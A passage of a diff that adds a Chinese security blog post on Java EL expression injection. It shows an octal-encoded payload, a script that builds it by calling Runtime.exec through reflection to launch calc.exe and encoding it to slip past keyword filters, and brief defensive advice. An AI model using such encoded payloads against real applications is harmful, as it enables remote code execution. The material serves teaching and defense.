class="number">50</span>\<span class="number">51</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">156</span>\<span class="number">165</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">51</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">143</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">143</span>\<span class="number">56</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">175</span></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(80, 80, 92);">JohnFord </font>编码脚本如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> s in str:</span><br><span class="line">  num = <span class="string">&quot;\\&quot;</span> + oct(ord(s))</span><br><span class="line">  result += num</span><br><span class="line"><span class="title function_">print</span><span class="params">(result.replace(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="OILfV">防御方法</h2>
+
+<ul>
+<li>尽量不使用外部输入的内容作为EL表达式的内容</li>
+<li>若使用，严格过滤EL表达式注入漏洞payload关键字</li>
+<li>如果是排查Java程序中JURL相关代码，则搜索如下关键类方法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Sean 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="Sean 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" rel="tag"># 表达式注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Valve内存马">
+                  <i class="fa fa-angle-left"></i> Valve内存马
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="FastJson 1.2.62-1.2.68反序列化漏洞">
+                  FastJson 1.2.62-1.2.68反序列化漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Sean</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
